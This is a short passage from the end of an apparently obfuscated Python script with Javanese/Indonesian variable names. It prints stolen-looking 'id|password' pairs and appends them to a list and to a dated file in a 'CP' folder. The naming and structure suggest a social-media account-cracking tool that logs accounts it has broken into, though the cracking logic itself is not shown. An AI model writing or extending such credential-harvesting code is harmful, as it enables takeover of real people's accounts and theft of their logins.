			except:pass
			__tulisan__("\r  %s* --> %s|%s         "%(__kuning__,__idcr__, __pwne__))
			cp.append("%s|%s"%(__idcr__, __pwne__))
			__mbukak__("CP/%s.txt"%(__tanggale__),"a").write("  * --> %s|%s\n"%(__idcr__, __pwne__))
			break
		else:
			continue

	loop += 1

if __name__ == '__main__':
	__menune__()
